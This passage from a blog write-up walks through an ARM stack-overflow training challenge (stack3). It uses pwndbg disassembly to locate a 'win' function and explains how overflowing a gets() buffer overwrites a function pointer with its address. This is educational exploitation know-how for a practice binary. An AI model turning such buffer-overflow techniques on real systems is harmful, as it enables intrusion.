-&lt;span class=&quot;mh&quot;&gt;0x10490&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;       &lt;span class=&quot;mh&quot;&gt;0x00010560&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bs&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00010560&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0x10560&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;s&quot;&gt;&quot;code flow successfully changed&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;So, our target is:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdisass&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10484&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
- &lt;span class=&quot;err&quot;&gt;►&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1047c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x10480&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x10484&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x10488&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-
-   &lt;span class=&quot;mh&quot;&gt;0x1048c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;a-comment&quot;&gt;A comment&lt;/h3&gt;
-
-&lt;p&gt;This is not the only way to do it.&lt;/p&gt;
-
-&lt;p&gt;I could search for a &lt;code class=&quot;highlighter-rouge&quot;&gt;puts&lt;/code&gt; call which whole be more likely to be the
-one that we are looking for:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; stack3 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;puts&quot;&lt;/span&gt;
-00010324 &amp;lt;puts@plt&amp;gt;:
-   10488:       ebffffa5        bl      10324 &amp;lt;puts@plt&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;I could look which functions are available:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;functions&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;functions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;Non&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debugging&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0x000102ec&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;_init&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0x0001030c&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0x00010318&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0x00010324&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0x0001047c&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0x00010494&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;I could use IDA or &lt;a href=&quot;https://rada.re/n/radare2.html&quot;&gt;Radare2&lt;/a&gt; or similar
-and do a &lt;code class=&quot;highlighter-rouge&quot;&gt;xref&lt;/code&gt;…&lt;/p&gt;
-
-&lt;p&gt;Or I could just read what is the goal from the
-&lt;a href=&quot;https://azeria-labs.com/part-3-stack-overflow-challenges/&quot;&gt;challenge&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;I preferred a longer path to explore more the commands of &lt;code class=&quot;highlighter-rouge&quot;&gt;pwndbg&lt;/code&gt;
-and stress a little more my brain.&lt;/p&gt;
-
-&lt;p&gt;Otherwise it wouldn’t be fun :)&lt;/p&gt;
-
-&lt;h2 id=&quot;lets-jump&quot;&gt;Let’s jump&lt;/h2&gt;
-
-&lt;p&gt;This is the &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdisass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;
- &lt;span class=&quot;err&quot;&gt;►&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10494&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x10498&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x1049c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x104a0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;str&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x104a4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;str&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x54&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x104a8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x104ac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;str&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x104b0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x104b4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x104b8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-
-   &lt;span class=&quot;mh&quot;&gt;0x104bc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x104c0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x104c4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;beq&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-
-   &lt;span class=&quot;mh&quot;&gt;0x104c8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x104cc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x104d0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-
-   &lt;span class=&quot;mh&quot;&gt;0x104d4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x104d8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;blx&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;So instead of a cookie like in the
-&lt;a href=&quot;/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html&quot;&gt;stack0&lt;/a&gt;
-or &lt;a href=&quot;/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-II.html&quot;&gt;stack1&lt;/a&gt;
-we have the address of a function.&lt;/p&gt;
-
-&lt;p&gt;&lt;label for=&quot;mn-5770f2836672d8a9a1954be60d8102c9&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-5770f2836672d8a9a1954be60d8102c9&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;blx r3&lt;/code&gt; is an unconditional jump to an absolute address
-(&lt;a href=&quot;https://developer.arm.com/documentation/dui0068/b/arm-instruction-reference/arm-branch-instructions/blx?lang=en&quot;&gt;docs&lt;/a&gt;).
-&lt;br /&gt;
-That's why it works.
- &lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;The address is initialized to zero but due to a stack overflow we can
-write an arbitrary address, in particular, the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt;:
-0x0001047c&lt;/p&gt;
-
